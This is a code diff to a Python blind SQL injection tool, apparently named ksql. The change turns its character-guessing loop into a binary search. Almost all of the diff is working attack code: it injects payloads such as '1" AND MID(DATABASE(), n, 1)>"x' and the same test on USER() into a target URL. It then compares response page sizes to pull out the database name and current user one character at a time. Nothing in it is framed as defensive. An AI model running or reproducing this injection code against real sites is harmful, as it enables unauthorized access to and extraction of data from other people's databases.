@@ -78,6 +78,8 @@ KSQL_ROOT_PATH   = modulePath()
 KSQL_XML_PATH    = os.path.join(KSQL_ROOT_PATH, 'xml')
 QUERIES_XML      = os.path.join(KSQL_XML_PATH, 'queries.xml')
 MAX_BLIND_COUNT  = 15
+ITOA64           = '0123456789@abcdefghijklmnopqrstuvwxyz'
+
 
 sqlliteCon    = sqlite3.connect(':memory:', check_same_thread=False)
 #sqlliteCon    = sqlite3.connect(KSQL_ROOT_PATH + '/ksql.db', check_same_thread=False)
@@ -95,33 +97,36 @@ def run(type, tmpUrl, num, succPageSize, frontThread):
 	if frontThread != None: 
 		frontThread.join()
 
-	ITOA64 = "abcdefghijklmnopqrstuvwxyz@0123456789"
-	for word in ITOA64:
+	low = 0
+	high = len(ITOA64) - 1
 
-		newUrl = tmpUrl
+	while(low <= high):  
+
+		now = datetime.datetime.now()
+
+		mid = (low + high)/2  
+		midval = ITOA64[mid]
 		
 		if type == '--current-db':
-			newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(),' + str(num) + ',1)="' + word)
-		
+			highSql = tmpUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(), %d, 1)>"%s' % (num, midval))
+			lowSql  = tmpUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(), %d, 1)<"%s' % (num, midval))
 		elif type == '--current-user':
-			newUrl = newUrl.replace('[[[ID]]]', '1" AND MID(USER(),' + str(num) + ',1)="' + word)
-			
-		currPageSize = len(htmlDecode(urllib.urlopen(newUrl).read()))
+			highSql = tmpUrl.replace('[[[ID]]]', '1" AND MID(USER(), %d, 1)>"%s' % (num, midval))
+			lowSql  = tmpUrl.replace('[[[ID]]]', '1" AND MID(USER(), %d, 1)<"%s' % (num, midval))
 		
-		now = datetime.datetime.now()
-		
-		printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), newUrl))
-		
-		if succPageSize == currPageSize:
-			sql = 'update info set value=value||"%s" where type="%s"' % (word, type)
+		printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), highSql))
+		printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), lowSql))
+
+		if len(htmlDecode(urllib.urlopen(lowSql).read())) == succPageSize:
+			high = mid - 1
+		elif len(htmlDecode(urllib.urlopen(highSql).read())) == succPageSize:
+			low = mid + 1
+		else:
+			sql = 'update info set value=value||"%s" where type="%s"' % (midval, type)
 			sqlliteCon.execute(sql)
 			sqlliteCon.commit()
-			
-			printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), word))
+			printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), midval))
 			break
-			
-		#time.sleep(0.1)
-
 
 def manage(type, url):
 	values = url.split('?')[-1]
@@ -162,7 +167,6 @@ def manage(type, url):
 		item.setDaemon(True)
 		item.start()
 	item.join()
-
 
 
 	cursor = sqlliteCursor.execute('select value from info where type="%s"' % type)
